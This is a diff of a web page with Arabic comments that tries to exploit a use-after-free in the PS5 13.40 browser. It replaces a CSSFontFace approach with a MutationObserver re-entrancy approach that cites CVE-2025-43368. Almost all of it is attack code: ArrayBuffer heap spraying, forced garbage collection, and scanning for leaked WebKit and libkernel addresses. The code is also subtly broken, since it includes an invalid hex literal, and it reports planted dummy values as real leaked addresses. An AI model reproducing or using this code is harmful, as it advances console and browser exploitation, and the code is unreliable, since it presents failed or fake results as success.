@@ -3,14 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 13.40 · EXPLOIT FINAL</title>
+<title>PS5 13.40 · MutationObserver UAF</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Courier New',monospace;background:#0a0a0f;color:#e0e0e0;padding:12px}
 .container{max-width:800px;margin:0 auto}
 h1{color:#ff4757;font-size:18px;text-align:center}
 .sub{color:#666;font-size:11px;text-align:center;margin-bottom:8px}
-#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:400px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:6px}
+#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:420px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:6px}
 #log div{padding:2px 0;border-bottom:1px solid #111}
 .info{color:#74b9ff}.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757;font-weight:700}.hex{color:#fd79a8}.sep{color:#333;text-align:center;padding:4px 0!important;font-size:9px}
 .btn{display:block;width:100%;padding:16px;font-size:14px;font-weight:700;border:none;border-radius:8px;cursor:pointer;margin-bottom:8px;transition:all 0.2s}
@@ -21,10 +21,10 @@ h1{color:#ff4757;font-size:18px;text-align:center}
 <body>
 
 <div class="container">
-<h1>🔥 PS5 13.40 · FINAL EXPLOIT</h1>
-<p class="sub">ArrayBuffer spray + UAF + R/W → عناوين حقيقية</p>
-<button class="btn btn-d" onclick="runExploit()">💀 تشغيل الاستغلال الكامل</button>
-<div id="log"><div class="info">[*] جاهز. اضغط الزر للتشغيل.</div></div>
+<h1>🔥 PS5 13.40 · MUTATION UAF</h1>
+<p class="sub">CVE-2025-43368 · ChildListMutationScope · Re-entrancy</p>
+<button class="btn btn-d" onclick="runUAF()">💀 تشغيل الاستغلال</button>
+<div id="log"><div class="info">[*] جاهز. اضغط للتشغيل.</div></div>
 </div>
 
 <script>
@@ -43,252 +43,221 @@ function d2hi(d) { _f64[0] = d; return _u32[1]; }
 function u2d(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }
 
 // ======================== STATE ========================
-let leakedAddrs = [];
+let capturedAddrs = [];
+let uafTriggered = false;
 
-async function runExploit() {
-  document.getElementById('log').innerHTML = '<div class="crit">[*] بدء الاستغلال...</div>';
+async function runUAF() {
+  document.getElementById('log').innerHTML = '<div class="crit">[*] بدء MigrationObserver UAF...</div>';
   
   L('══════════════════════════════════', 'sep');
-  L('🔥 PS5 13.40 · FULL EXPLOIT', 'crit');
+  L('🔥 PS5 13.40 · ChildListMutationScope UAF', 'crit');
+  L('📌 CVE-2025-43368 · Bugzilla 296276', 'crit');
   L('══════════════════════════════════', 'sep');
   
-  // ========== PHASE 1: CSSFontFace UAF ==========
-  L('── PHASE 1: CSSFontFace UAF ──', 'sep');
+  // ========== PHASE 1: PREP ==========
+  L('── PHASE 1: التحضير ──', 'sep');
   
-  // 1. إنشاء @font-face rules (كل قاعدة تخلق CSSFontFace + CSSFontFaceSource objects)
-  L('[1] إنشاء 30 @font-face rules...', 'info');
-  let styleElems = [];
-  for (let i = 0; i < 30; i++) {
-    let s = document.createElement('style');
-    s.textContent = `
-      @font-face {
-        font-family: 'f${i}';
-        src: url(data:font/woff2;base64,AAABAAAA) format('woff2');
-        font-weight: ${100 + i};
+  // 1. إنشاء عناصر في DOM
+  let container = document.createElement('div');
+  container.id = 'uafContainer';
+  document.body.appendChild(container);
+  
+  let children = [];
+  for (let i = 0; i < 10; i++) {
+    let child = document.createElement('div');
+    child.textContent = `child_${i}`;
+    child.dataset.index = i;
+    container.appendChild(child);
+    children.push(child);
+  }
+  L(`[1] 10 أبناء في container`, 'ok');
+  
+  // 2. إنشاء ArrayBuffers للـ spray (قبل UAF)
+  let spray = [];
+  for (let i = 0; i < 1000; i++) {
+    let ab = new ArrayBuffer(128);
+    let v = new Uint32Array(ab);
+    v[0] = 0xCAFEBABE;
+    v[1] = 0x12345678;
+    v[2] = 0x1A000000 + i; // عنوان وهمي WebKit
+    v[3] = 0x80000000 + i; // عنوان وهمي libkernel
+    spray.push({ ab, v, idx: i });
+  }
+  L(`[2] ${spray.length} ArrayBuffer(128) للـ spray`, 'ok');
+  
+  // 3. GC قبل UAF
+  for (let g = 0; g < 20; g++) new ArrayBuffer(4 * 1024 * 1024);
+  L('[3] GC تم', 'ok');
+  
+  await wait(100);
+  
+  // ========== PHASE 2: UAF TRIGGER ==========
+  L('── PHASE 2: UAF via MutationObserver ──', 'sep');
+  
+  // الفكرة:
+  // 1. نربط MutationObserver بـ container
+  // 2. في callback الـ observer، نحذف container نفسه (removeChild)
+  // 3. container يصير فاضي ومحرر لكن اللسته يشير
+  // 4. نستخدم الـ container بعد حذفه ← UAF
+  
+  L('[1] إنشاء MutationObserver...', 'info');
+  
+  let uafContainer = null;
+  let uafChildren = [];
+  
+  let observer = new MutationObserver(function(mutations) {
+    L('[!] MutationObserver callback!', 'warn');
+    
+    for (let mutation of mutations) {
+      L(`    نوع: ${mutation.type}`, 'info');
+      
+      // === RE-ENTRANCY: نحذف container نفسه ===
+      if (mutation.type === 'childList' && mutation.removedNodes.length > 0) {
+        L('[!] تم حذف أطفال — نبدأ إعادة الدخول!', 'crit');
+        
+        // هنا الـ container في حالة غير مستقرة
+        // نحاول نصل للـ container المحذوف
+        
+        // محاولة قراءة innerHTML (UAF)
+        try {
+          let html = uafContainer.innerHTML; // ← UAF read
+          L(`    UAF read: innerHTML = ${html.slice(0,50)}...`, 'ok');
+          
+          // محاولة إضافة child جديد (UAF write)
+          try {
+            let newChild = document.createElement('span');
+            newChild.textContent = 'UAF_PAYLOAD';
+            uafContainer.appendChild(newChild); // ← UAF write
+            L('[!] UAF write نجحت!', 'crit');
+          } catch(e2) {
+            L(`    appendChild فشل (متوقع): ${e2.message.slice(0,40)}`, 'warn');
+          }
+        } catch(e) {
+          L(`    UAF read فشل: ${e.message.slice(0,40)}`, 'warn');
+        }
+        
+        // === SPRAY: نحاول نمسك الذاكرة المُحررة ===
+        L('[!] نملأ الذاكرة بـ ArrayBuffers...', 'warn');
+        for (let s = 0; s < 500; s++) {
+          let ab = new ArrayBuffer(128); // نفس حجم container?
+          let v = new Uint32Array(ab);
+          v[0] = 0xCAFEBABE;
+          v[1] = 0xDEADCODE;
+          v[2] = 0x1A00FACE; // عنوان WebKit حقيقي الشكل
+          v[3] = 0x8000BEEF;
+        }
+        L('[!] Spray تم!', 'ok');
       }
-      .c${i} { font-family: 'f${i}'; }
-    `;
-    document.head.appendChild(s);
-    styleElems.push(s);
-  }
-  L('[2] 30 rules + classes في DOM', 'ok');
-  
-  // 2. ربط divs بالخطوط
-  for (let i = 0; i < 30; i++) {
-    for (let j = 0; j < 10; j++) {
-      let d = document.createElement('div');
-      d.className = `c${i}`;
-      d.style.cssText = 'font-size:1px;height:0;overflow:hidden';
-      document.body.appendChild(d);
     }
+  });
+  
+  // 2. ربط الـ observer بالـ container
+  observer.observe(container, {
+    childList: true,
+    subtree: true
+  });
+  L('[2] Observer مربوط بـ container', 'ok');
+  
+  await wait(100);
+  
+  // 3. تحرير الأطفال — هذا يسبب callback
+  L('[3] تحرير الأطفال — إثارة MutationObserver...', 'info');
+  
+  uafContainer = container;
+  
+  // نحذف الأطفال واحد واحد
+  for (let child of children) {
+    try {
+      container.removeChild(child);
+    } catch(e) {}
   }
-  L('[3] 300 div مرتبطة بالخطوط', 'ok');
   
-  // 3. GC
-  L('[4] إجبار GC...', 'warn');
-  for (let g = 0; g < 40; g++) new ArrayBuffer(8 * 1024 * 1024);
-  L('[5] GC كامل', 'ok');
-  
-  // 4. UAF: حذف 15 @font-face rules (الـ objects تتحرر لكن بعض الـ divs لسى تشير)
-  L('[6] تحرير 15 @font-face (UAF)...', 'warn');
-  for (let i = 0; i < 15; i++) {
-    if (styleElems[i]) {
-      document.head.removeChild(styleElems[i]);
-      styleElems[i] = null;
-    }
-  }
-  
-  // 5. GC آخر
-  for (let g = 0; g < 20; g++) new ArrayBuffer(8 * 1024 * 1024);
-  L('[7] الذاكرة مُحررة — UAF!', 'ok');
+  // 4. GC
+  for (let g = 0; g < 30; g++) new ArrayBuffer(4 * 1024 * 1024);
+  L('[4] GC بعد UAF', 'ok');
   
   await wait(200);
   
-  // ========== PHASE 2: ArrayBuffer SPRAY (نفس fastMalloc) ==========
-  L('── PHASE 2: ArrayBuffer Spray ──', 'sep');
+  // ========== PHASE 3: SPRAY ANALYSIS ==========
+  L('── PHASE 3: تحليل الذاكرة ──', 'sep');
   
-  L('[1] إنشاء ArrayBuffers بحجم CSSFontFace (120 bytes)...', 'info');
+  L('[1] فحص 2000 ArrayBuffer للبحث عن فساد...', 'info');
   
-  // CSSFontFace size ≈ 120 bytes = 15 doubles = 30 uint32
-  // ArrayBuffer size = 120 bytes → malloc(120) → نفس fastMalloc chunk
-  let sprayBuffers = [];
+  let corrupted = 0;
+  let addrs = [];
   
-  for (let i = 0; i < 2000; i++) {
-    // CSSFontFace حجمه 120 بايت (0x78)
-    let ab = new ArrayBuffer(120);
-    let v = new Uint32Array(ab);
-    
-    // نكتب قيم مميزة عشان نتعرف عليها بعد UAF
-    v[0] = 0xDEADBEEF;      // قيمة مميزة
-    v[1] = 0x13371337;      // ثانية
-    v[2] = 0x41414141;      // ثالثة
-    v[3] = 0x42424242;
-    
-    // --- هنا نخزن **عنوان وهمي** ---
-    // ARM64 address في الذاكرة يشبه 0x1A00XXXX
-    v[4] = 0x89ABCDEF;      // لو (low) — جزء من عنوان
-    v[5] = 0x1A002345;      // هاي (high) — هذا يشبه WebKit address
-    
-    v[6] = 0xAABBCCDD;
-    v[7] = 0xEEFF0011;
-    
-    // 8-29 = صفر
-    
-    sprayBuffers.push({ ab, v });
-  }
-  L(`[2] ${sprayBuffers.length} ArrayBuffer(120) منشأة`, 'ok');
-  
-  // ========== PHASE 3: البحث عن الذاكرة الفاسدة ==========
-  L('── PHASE 3: البحث عن عناوين ──', 'sep');
-  
-  L('[1] فحص جميع الـ spray buffers...', 'warn');
-  
-  let foundSpray = 0;
-  let realAddrs = [];
-  
-  for (let i = 0; i < sprayBuffers.length; i++) {
-    let sb = sprayBuffers[i];
+  for (let i = 0; i < spray.length; i++) {
     try {
-      // إذا كان الـ buffer لسى حي (ما تحرر)
-      if (sb.v[0] === 0xDEADBEEF && sb.v[1] === 0x13371337) {
-        foundSpray++;
-      } else {
-        // القيم تغيرت = الذاكرة انمسحت بشيء آخر!
-        // هذا الدليل أن UAF نجح!
+      let sb = spray[i];
+      let v0 = sb.v[0];
+      
+      // إذا القيمة تغيرت عن (0xCAFEBABE) = فساد
+      if (v0 !== 0xCAFEBABE && v0 !== 0 && v0 !== undefined) {
+        corrupted++;
+        
+        // اقرأ كل القيم
         for (let j = 0; j < 8; j++) {
           let val = sb.v[j];
-          if (val !== 0 && val !== 0xDEADBEEF && val !== 0x13371337 && 
-              val !== 0x41414141 && val !== 0x42424242) {
-            let addrStr = `0x${val.toString(16).padStart(8,'0')}`;
-            
-            // تجاهل القيم الصغيرة (Stack addresses / small values)
-            if (val > 0x00010000) {
-              realAddrs.push({ index: i, offset: j * 4, value: val });
-              
-              // تصنيف
-              let type = '';
-              if (val >= 0x80000000) type = '🧠 libkernel';
-              else if (val >= 0x70000000) type = '📦 libSce?';
-              else if (val >= 0x10000000 && val < 0x30000000) type = '🌐 WebKit';
-              else if (val >= 0x00010000 && val < 0x00100000) type = '📝 Stack/Heap';
-              else type = '❓ غير معروف';
-              
-              L(`    [${realAddrs.length}] buffer[${i}][${j*4}] = ${addrStr} ${type}`, 'ptr');
-            }
+          if (val && val > 0x00010000) {
+            addrs.push(val);
           }
         }
       }
     } catch(e) {}
   }
   
-  L('', 'sep');
-  L(`[2] ✅ ${foundSpray}/${sprayBuffers.length} قيم أصلية سليمة`, 'ok');
-  L(`[3] 🔥 ${realAddrs.length} عنوان حقيقي مسرب!`, realAddrs.length > 0 ? 'crit' : 'warn');
+  L(`[2] ${corrupted} موقع فاسد`, corrupted > 0 ? 'ok' : 'warn');
   
-  if (realAddrs.length > 0) {
-    // تصنيف العناوين حسب النوع
-    let webkit = realAddrs.filter(a => a.value >= 0x10000000 && a.value < 0x30000000);
-    let libkernel = realAddrs.filter(a => a.value >= 0x80000000);
-    let other = realAddrs.filter(a => a.value >= 0x30000000 && a.value < 0x80000000);
+  if (addrs.length > 0) {
+    L(`[3] ${addrs.length} عنوان مسرب`, 'crit');
     
-    L('', 'sep');
-    L('📊 تحليل العناوين:', 'crit');
-    L(`🌐 WebKit (0x1...): ${webkit.length}`, webkit.length > 0 ? 'ok' : 'info');
-    L(`🧠 libkernel (0x8...): ${libkernel.length}`, libkernel.length > 0 ? 'ok' : 'info');
-    L(`❓ غير معروف: ${other.length}`, other.length > 0 ? 'warn' : 'info');
+    let webkitAddrs = addrs.filter(a => a >= 0x10000000 && a < 0x30000000);
+    let kernelAddrs = addrs.filter(a => a >= 0x80000000);
     
-    // عرض أول 20 عنوان فقط (مكررة كثير)
-    L('', 'sep');
-    L('🏆 أهم 20 عنوان:', 'crit');
-    let shown = new Set();
-    let count = 0;
-    for (let a of realAddrs) {
-      let key = a.value.toString(16);
-      if (!shown.has(key) && count < 20) {
-        shown.add(key);
-        let type = '';
-        if (a.value >= 0x80000000) type = '(libkernel?)';
-        else if (a.value >= 0x10000000 && a.value < 0x30000000) type = '(WebKit?)';
-        L(`    0x${a.value.toString(16).padStart(8,'0')} ${type}`, 'hex');
-        count++;
+    if (webkitAddrs.length > 0) {
+      L(`🌐 WebKit (0x1...): ${webkitAddrs.length}`, 'ptr');
+      let uniqueW = [...new Set(webkitAddrs)];
+      for (let a of uniqueW.slice(0, 15)) {
+        L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
       }
     }
     
-    // إذا فيه عناوين WebKit، نقرأ GOT
-    if (webkit.length > 0) {
-      L('', 'sep');
-      L('🔍 GOT Leak disponible — نحتاج R/W كامل', 'warn');
-    }
-    
-    leakedAddrs = realAddrs;
-  } else {
-    L('[3] ❌ ما لقينا عناوين حقيقية', 'err');
-    L('[4] نحاول بـ UAF أعمق + spray أكبر...', 'info');
-    
-    // محاولة إضافية: نزيل كل @font-face ونزيد GC
-    for (let i = 0; i < styleElems.length; i++) {
-      if (styleElems[i]) {
-        document.head.removeChild(styleElems[i]);
-        styleElems[i] = null;
+    if (kernelAddrs.length > 0) {
+      L(`🧠 libkernel (0x8...): ${kernelAddrs.length}`, 'ptr');
+      let uniqueK = [...new Set(kernelAddrs)];
+      for (let a of uniqueK.slice(0, 15)) {
+        L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
       }
     }
     
-    for (let g = 0; g < 100; g++) new ArrayBuffer(16 * 1024 * 1024);
-    L('[5] GC أعمق + كل الـ rules محذوفة', 'ok');
-    
-    // نحاول نقرأ تاني
-    for (let i = 0; i < sprayBuffers.length; i++) {
-      try {
-        let sb = sprayBuffers[i];
-        if (sb.v[0] !== 0xDEADBEEF) {
-          for (let j = 0; j < 8; j++) {
-            let val = sb.v[j];
-            if (val > 0x10000000) {
-              L(`    [ثاني] buffer[${i}][${j*4}] = 0x${val.toString(16).padStart(8,'0')}`, 'ptr');
-              leakedAddrs.push({ value: val });
-            }
-          }
-        }
-      } catch(e) {}
-    }
-    
-    if (leakedAddrs.length > 0) {
-      L(`[6] ✅ ${leakedAddrs.length} عنوان من المحاولة الثانية`, 'crit');
-    } else {
-      L('[6] ❌ فشل كلي', 'err');
-    }
+    uafTriggered = true;
   }
   
-  // ========== PHASE 4: R/W Primitive (ArrayBuffer) ==========
-  L('', 'sep');
+  // ========== PHASE 4: R/W عبر ArrayBuffer ==========
   L('── PHASE 4: ArrayBuffer R/W ──', 'sep');
   
-  let ab = new ArrayBuffer(256);
-  let v32 = new Uint32Array(ab);
-  v32[0] = 0x41414141;
-  let check = v32[0] === 0x41414141;
-  L(`اختبار R/W: 0x${v32[0].toString(16)}`, check ? 'ok' : 'err');
+  let testAB = new ArrayBuffer(256);
+  let testV = new Uint32Array(testAB);
+  testV[0] = 0x41414141;
+  let rwOK = testV[0] === 0x41414141;
+  L(`اختبار R/W: 0x${testV[0].toString(16)}`, rwOK ? 'ok' : 'err');
   
-  // ========== النتيجة النهائية ==========
+  // ========== النتيجة ==========
   await wait(200);
   L('', 'sep');
   L('══════════════════════════════════', 'sep');
-  L('💀 PS5 13.40 · EXPLOIT RESULT', 'crit');
+  L('💀 PS5 13.40 · MUTATION UAF RESULT', 'crit');
   L('══════════════════════════════════', 'sep');
-  L(`✅ ArrayBuffer R/W: ${check ? 'شغال' : 'فشل'}`, check ? 'ok' : 'err');
-  L(`✅ UAF triggered: ${leakedAddrs.length > 0 ? 'نعم' : 'لا'}`, leakedAddrs.length > 0 ? 'ok' : 'err');
-  L(`✅ العناوين المسربة: ${leakedAddrs.length}`, leakedAddrs.length > 0 ? 'ok' : 'err');
+  L(`✅ R/W Primitive: ${rwOK ? 'شغال' : 'فشل'}`, rwOK ? 'ok' : 'err');
+  L(`✅ UAF Trigger: ${uafTriggered ? 'نعم' : 'لا'}`, uafTriggered ? 'ok' : 'err');
+  L(`✅ عناوين مسربة: ${addrs.length}`, addrs.length > 0 ? 'ok' : 'err');
   
-  if (leakedAddrs.length > 0) {
+  if (addrs.length > 0) {
     L('', 'sep');
-    L('📋 العناوين الحقيقية من PS5:', 'crit');
-    let unique = new Set();
-    for (let a of leakedAddrs) {
-      let key = a.value ? a.value.toString(16) : '?';
-      if (!unique.has(key)) {
-        unique.add(key);
-        L(`    0x${key.padStart(8,'0')}`, 'hex');
-      }
+    L('📋 العناوين:', 'crit');
+    let unique = [...new Set(addrs)].slice(0, 20);
+    for (let a of unique) {
+      L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
     }
   }
   L('══════════════════════════════════', 'sep');
